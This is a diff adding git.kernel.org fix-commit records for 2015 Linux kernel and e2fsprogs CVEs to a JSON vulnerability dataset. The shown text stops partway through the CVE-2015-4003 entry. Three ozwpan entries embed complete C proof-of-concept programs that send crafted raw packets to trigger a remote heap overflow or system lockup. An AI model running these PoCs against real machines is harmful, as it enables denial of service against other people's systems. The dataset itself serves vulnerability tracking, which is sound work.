@@ -1,6 +1,435 @@
 {
   "year": 2015,
-  "total": 0,
+  "total": 62,
   "reference": "git.kernel.org",
-  "reports": {}
+  "reports": {
+    "CVE-2015-0239": [
+      {
+        "url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=f3747379accba8e95d70cec0eae0582c8c182050",
+        "title": "KVM: x86: SYSENTER emulation is broken",
+        "description": "SYSENTER emulation is broken in several ways: 1. It misses the case of 16-bit code segments completely (CVE-2015-0239). 2. MSR_IA32_SYSENTER_CS is checked in 64-bit mode incorrectly (bits 0 and 1 can still be set without causing #GP). 3. MSR_IA32_SYSENTER_EIP and MSR_IA32_SYSENTER_ESP are not masked in legacy-mode. 4. There is some unneeded code. Fix it. Cc: stable@vger.linux.org Signed-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
+      }
+    ],
+    "CVE-2015-0247": [
+      {
+        "url": "http://git.kernel.org/cgit/fs/ext2/e2fsprogs.git/commit/?id=f66e6ce4",
+        "title": "libext2fs: avoid buffer overflow if s_first_meta_bg is too big",
+        "description": "If s_first_meta_bg is greater than the of number block group descriptor blocks, then reading or writing the block group descriptors will end up overruning the memory buffer allocated for the descriptors. Fix this by limiting first_meta_bg to no more than fs->desc_blocks. This doesn't correct the bad s_first_meta_bg value, but it avoids causing the e2fsprogs userspace programs from potentially crashing. Signed-off-by: Theodore Ts'o <tytso@mit.edu>"
+      }
+    ],
+    "CVE-2015-1333": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ca4da5dd1f99fe9c59f1709fb43e818b18ad20e0",
+        "title": "KEYS: ensure we free the assoc array edit if edit is valid",
+        "description": "__key_link_end is not freeing the associated array edit structure and this leads to a 512 byte memory leak each time an identical existing key is added with add_key(). The reason the add_key() system call returns okay is that key_create_or_update() calls __key_link_begin() before checking to see whether it can update a key directly rather than adding/replacing - which it turns out it can. Thus __key_link() is not called through __key_instantiate_and_link() and __key_link_end() must cancel the edit. CVE-2015-1333 Signed-off-by: Colin Ian King <colin.king@canonical.com> Signed-off-by: David Howells <dhowells@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>"
+      }
+    ],
+    "CVE-2015-1339": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=2c5816b4beccc8ba709144539f6fdd764f8fa49c",
+        "title": "cuse: fix memory leak",
+        "description": "The problem is that fuse_dev_alloc() acquires an extra reference to cc.fc, and the original ref count is never dropped. Reported-by: Colin Ian King <colin.king@canonical.com> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Fixes: cc080e9e9be1 (\"fuse: introduce per-instance fuse_dev structure\") Cc: <stable@vger.kernel.org> # v4.2+"
+      }
+    ],
+    "CVE-2015-1572": [
+      {
+        "url": "https://git.kernel.org/cgit/fs/ext2/e2fsprogs.git/commit/?id=49d0fe2a14f2a23da2fe299643379b8c1d37df73",
+        "title": "libext2fs: fix potential buffer overflow in closefs()",
+        "description": "The bug fix in f66e6ce4446: \"libext2fs: avoid buffer overflow if s_first_meta_bg is too big\" had a typo in the fix for ext2fs_closefs(). In practice most of the security exposure was from the openfs path, since this meant if there was a carefully crafted file system, buffer overrun would be triggered when the file system was opened. However, if corrupted file system didn't trip over some corruption check, and then the file system was modified via tune2fs or debugfs, such that the superblock was marked dirty and then written out via the closefs() path, it's possible that the buffer overrun could be triggered when the file system is closed. Also clear up a signed vs unsigned warning while we're at it. Thanks to Nick Kralevich <nnk@google.com> for asking me to look at compiler warning in the code in question, which led me to notice the bug in f66e6ce4446. Addresses: CVE-2015-1572 Signed-off-by: Theodore Ts'o <tytso@mit.edu>"
+      }
+    ],
+    "CVE-2015-1593": [
+      {
+        "url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=4e7c22d447bb6d7e37bfe39ff658486ae78e8d77",
+        "title": "x86, mm/ASLR: Fix stack randomization on 64-bit systems",
+        "description": "The issue is that the stack for processes is not properly randomized on 64 bit architectures due to an integer overflow. The affected function is randomize_stack_top() in file \"fs/binfmt_elf.c\": static unsigned long randomize_stack_top(unsigned long stack_top) { unsigned int random_variable = 0; if ((current->flags & PF_RANDOMIZE) && !(current->personality & ADDR_NO_RANDOMIZE)) { random_variable = get_random_int() & STACK_RND_MASK; random_variable <<= PAGE_SHIFT; } return PAGE_ALIGN(stack_top) + random_variable; return PAGE_ALIGN(stack_top) - random_variable; } Note that, it declares the \"random_variable\" variable as \"unsigned int\". Since the result of the shifting operation between STACK_RND_MASK (which is 0x3fffff on x86_64, 22 bits) and PAGE_SHIFT (which is 12 on x86_64): random_variable <<= PAGE_SHIFT; then the two leftmost bits are dropped when storing the result in the \"random_variable\". This variable shall be at least 34 bits long to hold the (22+12) result. These two dropped bits have an impact on the entropy of process stack. Concretely, the total stack entropy is reduced by four: from 2^28 to 2^30 (One fourth of expected entropy). This patch restores back the entropy by correcting the types involved in the operations in the functions randomize_stack_top() and stack_maxrandom_size(). The successful fix can be tested with: $ for i in `seq 1 10`; do cat /proc/self/maps | grep stack; done 7ffeda566000-7ffeda587000 rw-p 00000000 00:00 0 [stack] 7fff5a332000-7fff5a353000 rw-p 00000000 00:00 0 [stack] 7ffcdb7a1000-7ffcdb7c2000 rw-p 00000000 00:00 0 [stack] 7ffd5e2c4000-7ffd5e2e5000 rw-p 00000000 00:00 0 [stack] ... Once corrected, the leading bytes should be between 7ffc and 7fff, rather than always being 7fff. Signed-off-by: Hector Marco-Gisbert <hecmargi@upv.es> Signed-off-by: Ismael Ripoll <iripoll@upv.es> [ Rebased, fixed 80 char bugs, cleaned up commit message, added test example and CVE ] Signed-off-by: Kees Cook <keescook@chromium.org> Cc: <stable@vger.kernel.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Al Viro <viro@zeniv.linux.org.uk> Fixes: CVE-2015-1593 Link: http://lkml.kernel.org/r/20150214173350.GA18393@www.outflux.net Signed-off-by: Borislav Petkov <bp@suse.de>"
+      }
+    ],
+    "CVE-2015-2150": [
+      {
+        "url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=af6fc858a35b90e89ea7a7ee58e66628c55c776b",
+        "title": "xen-pciback: limit guest control of command register",
+        "description": "Otherwise the guest can abuse that control to cause e.g. PCIe Unsupported Request responses by disabling memory and/or I/O decoding and subsequently causing (CPU side) accesses to the respective address ranges, which (depending on system configuration) may be fatal to the host. Note that to alter any of the bits collected together as PCI_COMMAND_GUEST permissive mode is now required to be enabled globally or on the specific device. This is CVE-2015-2150 / XSA-120. Signed-off-by: Jan Beulich <jbeulich@suse.com> Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Cc: <stable@vger.kernel.org> Signed-off-by: David Vrabel <david.vrabel@citrix.com>"
+      }
+    ],
+    "CVE-2015-2666": [
+      {
+        "url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=f84598bd7c851f8b0bf8cd0d7c3be0d73c432ff4",
+        "title": "x86/microcode/intel: Guard against stack overflow in the loader",
+        "description": "mc_saved_tmp is a static array allocated on the stack, we need to make sure mc_saved_count stays within its bounds, otherwise we're overflowing the stack in _save_mc(). A specially crafted microcode header could lead to a kernel crash or potentially kernel execution. Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Cc: \"H. Peter Anvin\" <hpa@zytor.com> Cc: Fenghua Yu <fenghua.yu@intel.com> Link: http://lkml.kernel.org/r/1422964824-22056-1-git-send-email-quentin.casasnovas@oracle.com Signed-off-by: Borislav Petkov <bp@suse.de>"
+      }
+    ],
+    "CVE-2015-2672": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=06c8173eb92bbfc03a0fe8bb64315857d0badd06",
+        "title": "x86/fpu/xsaves: Fix improper uses of __ex_table",
+        "description": "Commit: f31a9f7c7169 (\"x86/xsaves: Use xsaves/xrstors to save and restore xsave area\") introduced alternative instructions for XSAVES/XRSTORS and commit: adb9d526e982 (\"x86/xsaves: Add xsaves and xrstors support for booting time\") added support for the XSAVES/XRSTORS instructions at boot time. Unfortunately both failed to properly protect them against faulting: The 'xstate_fault' macro will use the closest label named '1' backward and that ends up in the .altinstr_replacement section rather than in .text. This means that the kernel will never find in the __ex_table the .text address where this instruction might fault, leading to serious problems if userspace manages to trigger the fault. Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Signed-off-by: Jamie Iles <jamie.iles@oracle.com> [ Improved the changelog, fixed some whitespace noise. ] Acked-by: Borislav Petkov <bp@alien8.de> Acked-by: Linus Torvalds <torvalds@linux-foundation.org> Cc: <stable@vger.kernel.org> Cc: Allan Xavier <mr.a.xavier@gmail.com> Cc: H. Peter Anvin <hpa@zytor.com> Cc: Thomas Gleixner <tglx@linutronix.de> Fixes: adb9d526e982 (\"x86/xsaves: Add xsaves and xrstors support for booting time\") Fixes: f31a9f7c7169 (\"x86/xsaves: Use xsaves/xrstors to save and restore xsave area\") Signed-off-by: Ingo Molnar <mingo@kernel.org>"
+      }
+    ],
+    "CVE-2015-2686": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=4de930efc23b92ddf88ce91c405ee645fe6e27ea",
+        "title": "net: validate the range we feed to iov_iter_init() in sys_sendto/sys_recvfrom",
+        "description": "Cc: stable@vger.kernel.org # v3.19 Signed-off-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>"
+      }
+    ],
+    "CVE-2015-2830": [
+      {
+        "url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=956421fbb74c3a6261903f3836c0740187cf038b",
+        "title": "x86/asm/entry/64: Remove a bogus 'ret_from_fork' optimization",
+        "description": "'ret_from_fork' checks TIF_IA32 to determine whether 'pt_regs' and the related state make sense for 'ret_from_sys_call'. This is entirely the wrong check. TS_COMPAT would make a little more sense, but there's really no point in keeping this optimization at all. This fixes a return to the wrong user CS if we came from int 0x80 in a 64-bit task. Signed-off-by: Andy Lutomirski <luto@amacapital.net> Cc: Borislav Petkov <bp@alien8.de> Cc: Denys Vlasenko <dvlasenk@redhat.com> Cc: H. Peter Anvin <hpa@zytor.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: <stable@vger.kernel.org> Link: http://lkml.kernel.org/r/4710be56d76ef994ddf59087aad98c000fbab9a4.1424989793.git.luto@amacapital.net [ Backported from tip:x86/asm. ] Signed-off-by: Ingo Molnar <mingo@kernel.org>"
+      }
+    ],
+    "CVE-2015-2923": [
+      {
+        "url": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6fd99094de2b83d1d4c8457f2c83483b2828e75a",
+        "title": "ipv6: Don't reduce hop limit for an interface",
+        "description": "A local route may have a lower hop_limit set than global routes do. RFC 3756, Section 4.2.7, \"Parameter Spoofing\" > 1. The attacker includes a Current Hop Limit of one or another small > number which the attacker knows will cause legitimate packets to > be dropped before they reach their destination. > As an example, one possible approach to mitigate this threat is to > ignore very small hop limits. The nodes could implement a > configurable minimum hop limit, and ignore attempts to set it below > said limit. Signed-off-by: D.S. Ljungmark <ljungmark@modio.se> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
+      }
+    ],
+    "CVE-2015-3214": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ee73f656a604d5aa9df86a97102e4e462dd79924",
+        "title": "KVM: PIT: control word is write-only",
+        "description": "PIT control word (address 0x43) is write-only, reads are undefined. Cc: stable@kernel.org Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>"
+      }
+    ],
+    "CVE-2015-3288": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6b7339f4c31ad69c8e9c0b2859276e22cf72176d",
+        "title": "mm: avoid setting up anonymous pages into file mapping",
+        "description": "Reading page fault handler code I've noticed that under right circumstances kernel would map anonymous pages into file mappings: if the VMA doesn't have vm_ops->fault() and the VMA wasn't fully populated on ->mmap(), kernel would handle page fault to not populated pte with do_anonymous_page(). Let's change page fault handler to use do_anonymous_page() only on anonymous VMA (->vm_ops == NULL) and make sure that the VMA is not shared. For file mappings without vm_ops->fault() or shred VMA without vm_ops, page fault on pte_none() entry would lead to SIGBUS. Signed-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Willy Tarreau <w@1wt.eu> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
+      }
+    ],
+    "CVE-2015-3290": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=9b6e6a8334d56354853f9c255d1395c2ba570e0a",
+        "title": "x86/nmi/64: Switch stacks on userspace NMI entry",
+        "description": "Returning to userspace is tricky: IRET can fail, and ESPFIX can rearrange the stack prior to IRET. The NMI nesting fixup relies on a precise stack layout and atomic IRET. Rather than trying to teach the NMI nesting fixup to handle ESPFIX and failed IRET, punt: run NMIs that came from user mode on the normal kernel stack. This will make some nested NMIs visible to C code, but the C code is okay with that. As a side effect, this should speed up perf: it eliminates an RDMSR when NMIs come from user mode. Signed-off-by: Andy Lutomirski <luto@kernel.org> Reviewed-by: Steven Rostedt <rostedt@goodmis.org> Reviewed-by: Borislav Petkov <bp@suse.de> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: stable@vger.kernel.org Signed-off-by: Ingo Molnar <mingo@kernel.org>"
+      }
+    ],
+    "CVE-2015-3331": [
+      {
+        "url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=ccfe8c3f7e52ae83155cb038753f4c75b774ca8a",
+        "title": "crypto: aesni - fix memory usage in GCM decryption",
+        "description": "The kernel crypto API logic requires the caller to provide the length of (ciphertext || authentication tag) as cryptlen for the AEAD decryption operation. Thus, the cipher implementation must calculate the size of the plaintext output itself and cannot simply use cryptlen. The RFC4106 GCM decryption operation tries to overwrite cryptlen memory in req->dst. As the destination buffer for decryption only needs to hold the plaintext memory but cryptlen references the input buffer holding (ciphertext || authentication tag), the assumption of the destination buffer length in RFC4106 GCM operation leads to a too large size. This patch simply uses the already calculated plaintext size. In addition, this patch fixes the offset calculation of the AAD buffer pointer: as mentioned before, cryptlen already includes the size of the tag. Thus, the tag does not need to be added. With the addition, the AAD will be written beyond the already allocated buffer. Note, this fixes a kernel crash that can be triggered from user space via AF_ALG(aead) -- simply use the libkcapi test application from [1] and update it to use rfc4106-gcm-aes. Using [1], the changes were tested using CAVS vectors to demonstrate that the crypto operation still delivers the right results. [1] http://www.chronox.de/libkcapi.html CC: Tadeusz Struk <tadeusz.struk@intel.com> Cc: stable@vger.kernel.org Signed-off-by: Stephan Mueller <smueller@chronox.de> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
+      }
+    ],
+    "CVE-2015-4001": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c",
+        "title": "ozwpan: Use unsigned ints to prevent heap overflow",
+        "description": "Using signed integers, the subtraction between required_size and offset could wind up being negative, resulting in a memcpy into a heap buffer with a negative length, resulting in huge amounts of network-supplied data being copied into the heap, which could potentially lead to remote code execution.. This is remotely triggerable with a magic packet. A PoC which obtains DoS follows below. It requires the ozprotocol.h file from this module. =-=-=-=-=-= #include <arpa/inet.h> #include <linux/if_packet.h> #include <net/if.h> #include <netinet/ether.h> #include <stdio.h> #include <string.h> #include <stdlib.h> #include <endian.h> #include <sys/ioctl.h> #include <sys/socket.h> #define u8 uint8_t #define u16 uint16_t #define u32 uint32_t #define __packed __attribute__((__packed__)) #include \"ozprotocol.h\" static int hex2num(char c) { if (c >= '0' && c <= '9') return c - '0'; if (c >= 'a' && c <= 'f') return c - 'a' + 10; if (c >= 'A' && c <= 'F') return c - 'A' + 10; return -1; } static int hwaddr_aton(const char *txt, uint8_t *addr) { int i; for (i = 0; i < 6; i++) { int a, b; a = hex2num(*txt++); if (a < 0) return -1; b = hex2num(*txt++); if (b < 0) return -1; *addr++ = (a << 4) | b; if (i < 5 && *txt++ != ':') return -1; } return 0; } int main(int argc, char *argv[]) { if (argc < 3) { fprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]); return 1; } uint8_t dest_mac[6]; if (hwaddr_aton(argv[2], dest_mac)) { fprintf(stderr, \"Invalid mac address.\\n\"); return 1; } int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); if (sockfd < 0) { perror(\"socket\"); return 1; } struct ifreq if_idx; int interface_index; strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1); if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { perror(\"SIOCGIFINDEX\"); return 1; } interface_index = if_idx.ifr_ifindex; if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { perror(\"SIOCGIFHWADDR\"); return 1; } uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data; struct { struct ether_header ether_header; struct oz_hdr oz_hdr; struct oz_elt oz_elt; struct oz_elt_connect_req oz_elt_connect_req; } __packed connect_packet = { .ether_header = { .ether_type = htons(OZ_ETHERTYPE), .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } }, .oz_hdr = { .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), .last_pkt_num = 0, .pkt_num = htole32(0) }, .oz_elt = { .type = OZ_ELT_CONNECT_REQ, .length = sizeof(struct oz_elt_connect_req) }, .oz_elt_connect_req = { .mode = 0, .resv1 = {0}, .pd_info = 0, .session_id = 0, .presleep = 35, .ms_isoc_latency = 0, .host_vendor = 0, .keep_alive = 0, .apps = htole16((1 << OZ_APPID_USB) | 0x1), .max_len_div16 = 0, .ms_per_isoc = 0, .up_audio_buf = 0, .ms_per_elt = 0 } }; struct { struct ether_header ether_header; struct oz_hdr oz_hdr; struct oz_elt oz_elt; struct oz_get_desc_rsp oz_get_desc_rsp; } __packed pwn_packet = { .ether_header = { .ether_type = htons(OZ_ETHERTYPE), .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } }, .oz_hdr = { .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), .last_pkt_num = 0, .pkt_num = htole32(1) }, .oz_elt = { .type = OZ_ELT_APP_DATA, .length = sizeof(struct oz_get_desc_rsp) }, .oz_get_desc_rsp = { .app_id = OZ_APPID_USB, .elt_seq_num = 0, .type = OZ_GET_DESC_RSP, .req_id = 0, .offset = htole16(2), .total_size = htole16(1), .rcode = 0, .data = {0} } }; struct sockaddr_ll socket_address = { .sll_ifindex = interface_index, .sll_halen = ETH_ALEN, .sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } }; if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { perror(\"sendto\"); return 1; } usleep(300000); if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { perror(\"sendto\"); return 1; } return 0; } Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com> Acked-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
+      }
+    ],
+    "CVE-2015-4002": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=d114b9fe78c8d6fc6e70808c2092aa307c36dc8e",
+        "title": "ozwpan: Use proper check to prevent heap overflow",
+        "description": "Since elt->length is a u8, we can make this variable a u8. Then we can do proper bounds checking more easily. Without this, a potentially negative value is passed to the memcpy inside oz_hcd_get_desc_cnf, resulting in a remotely exploitable heap overflow with network supplied data. This could result in remote code execution. A PoC which obtains DoS follows below. It requires the ozprotocol.h file from this module. =-=-=-=-=-= #include <arpa/inet.h> #include <linux/if_packet.h> #include <net/if.h> #include <netinet/ether.h> #include <stdio.h> #include <string.h> #include <stdlib.h> #include <endian.h> #include <sys/ioctl.h> #include <sys/socket.h> #define u8 uint8_t #define u16 uint16_t #define u32 uint32_t #define __packed __attribute__((__packed__)) #include \"ozprotocol.h\" static int hex2num(char c) { if (c >= '0' && c <= '9') return c - '0'; if (c >= 'a' && c <= 'f') return c - 'a' + 10; if (c >= 'A' && c <= 'F') return c - 'A' + 10; return -1; } static int hwaddr_aton(const char *txt, uint8_t *addr) { int i; for (i = 0; i < 6; i++) { int a, b; a = hex2num(*txt++); if (a < 0) return -1; b = hex2num(*txt++); if (b < 0) return -1; *addr++ = (a << 4) | b; if (i < 5 && *txt++ != ':') return -1; } return 0; } int main(int argc, char *argv[]) { if (argc < 3) { fprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]); return 1; } uint8_t dest_mac[6]; if (hwaddr_aton(argv[2], dest_mac)) { fprintf(stderr, \"Invalid mac address.\\n\"); return 1; } int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); if (sockfd < 0) { perror(\"socket\"); return 1; } struct ifreq if_idx; int interface_index; strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1); if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { perror(\"SIOCGIFINDEX\"); return 1; } interface_index = if_idx.ifr_ifindex; if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { perror(\"SIOCGIFHWADDR\"); return 1; } uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data; struct { struct ether_header ether_header; struct oz_hdr oz_hdr; struct oz_elt oz_elt; struct oz_elt_connect_req oz_elt_connect_req; } __packed connect_packet = { .ether_header = { .ether_type = htons(OZ_ETHERTYPE), .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } }, .oz_hdr = { .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), .last_pkt_num = 0, .pkt_num = htole32(0) }, .oz_elt = { .type = OZ_ELT_CONNECT_REQ, .length = sizeof(struct oz_elt_connect_req) }, .oz_elt_connect_req = { .mode = 0, .resv1 = {0}, .pd_info = 0, .session_id = 0, .presleep = 35, .ms_isoc_latency = 0, .host_vendor = 0, .keep_alive = 0, .apps = htole16((1 << OZ_APPID_USB) | 0x1), .max_len_div16 = 0, .ms_per_isoc = 0, .up_audio_buf = 0, .ms_per_elt = 0 } }; struct { struct ether_header ether_header; struct oz_hdr oz_hdr; struct oz_elt oz_elt; struct oz_get_desc_rsp oz_get_desc_rsp; } __packed pwn_packet = { .ether_header = { .ether_type = htons(OZ_ETHERTYPE), .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } }, .oz_hdr = { .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), .last_pkt_num = 0, .pkt_num = htole32(1) }, .oz_elt = { .type = OZ_ELT_APP_DATA, .length = sizeof(struct oz_get_desc_rsp) - 2 }, .oz_get_desc_rsp = { .app_id = OZ_APPID_USB, .elt_seq_num = 0, .type = OZ_GET_DESC_RSP, .req_id = 0, .offset = htole16(0), .total_size = htole16(0), .rcode = 0, .data = {0} } }; struct sockaddr_ll socket_address = { .sll_ifindex = interface_index, .sll_halen = ETH_ALEN, .sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } }; if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { perror(\"sendto\"); return 1; } usleep(300000); if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { perror(\"sendto\"); return 1; } return 0; } Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com> Acked-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
+      },
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=9a59029bc218b48eff8b5d4dde5662fd79d3e1a8",
+        "title": "ozwpan: unchecked signed subtraction leads to DoS",
+        "description": "The subtraction here was using a signed integer and did not have any bounds checking at all. This commit adds proper bounds checking, made easy by use of an unsigned integer. This way, a single packet won't be able to remotely trigger a massive loop, locking up the system for a considerable amount of time. A PoC follows below, which requires ozprotocol.h from this module. =-=-=-=-=-= #include <arpa/inet.h> #include <linux/if_packet.h> #include <net/if.h> #include <netinet/ether.h> #include <stdio.h> #include <string.h> #include <stdlib.h> #include <endian.h> #include <sys/ioctl.h> #include <sys/socket.h> #define u8 uint8_t #define u16 uint16_t #define u32 uint32_t #define __packed __attribute__((__packed__)) #include \"ozprotocol.h\" static int hex2num(char c) { if (c >= '0' && c <= '9') return c - '0'; if (c >= 'a' && c <= 'f') return c - 'a' + 10; if (c >= 'A' && c <= 'F') return c - 'A' + 10; return -1; } static int hwaddr_aton(const char *txt, uint8_t *addr) { int i; for (i = 0; i < 6; i++) { int a, b; a = hex2num(*txt++); if (a < 0) return -1; b = hex2num(*txt++); if (b < 0) return -1; *addr++ = (a << 4) | b; if (i < 5 && *txt++ != ':') return -1; } return 0; } int main(int argc, char *argv[]) { if (argc < 3) { fprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]); return 1; } uint8_t dest_mac[6]; if (hwaddr_aton(argv[2], dest_mac)) { fprintf(stderr, \"Invalid mac address.\\n\"); return 1; } int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); if (sockfd < 0) { perror(\"socket\"); return 1; } struct ifreq if_idx; int interface_index; strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1); if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { perror(\"SIOCGIFINDEX\"); return 1; } interface_index = if_idx.ifr_ifindex; if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { perror(\"SIOCGIFHWADDR\"); return 1; } uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data; struct { struct ether_header ether_header; struct oz_hdr oz_hdr; struct oz_elt oz_elt; struct oz_elt_connect_req oz_elt_connect_req; struct oz_elt oz_elt2; struct oz_multiple_fixed oz_multiple_fixed; } __packed packet = { .ether_header = { .ether_type = htons(OZ_ETHERTYPE), .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } }, .oz_hdr = { .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), .last_pkt_num = 0, .pkt_num = htole32(0) }, .oz_elt = { .type = OZ_ELT_CONNECT_REQ, .length = sizeof(struct oz_elt_connect_req) }, .oz_elt_connect_req = { .mode = 0, .resv1 = {0}, .pd_info = 0, .session_id = 0, .presleep = 0, .ms_isoc_latency = 0, .host_vendor = 0, .keep_alive = 0, .apps = htole16((1 << OZ_APPID_USB) | 0x1), .max_len_div16 = 0, .ms_per_isoc = 0, .up_audio_buf = 0, .ms_per_elt = 0 }, .oz_elt2 = { .type = OZ_ELT_APP_DATA, .length = sizeof(struct oz_multiple_fixed) - 3 }, .oz_multiple_fixed = { .app_id = OZ_APPID_USB, .elt_seq_num = 0, .type = OZ_USB_ENDPOINT_DATA, .endpoint = 0, .format = OZ_DATA_F_MULTIPLE_FIXED, .unit_size = 1, .data = {0} } }; struct sockaddr_ll socket_address = { .sll_ifindex = interface_index, .sll_halen = ETH_ALEN, .sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } }; if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { perror(\"sendto\"); return 1; } return 0; } Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com> Acked-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
+      }
+    ],
+    "CVE-2015-4003": [
+      {
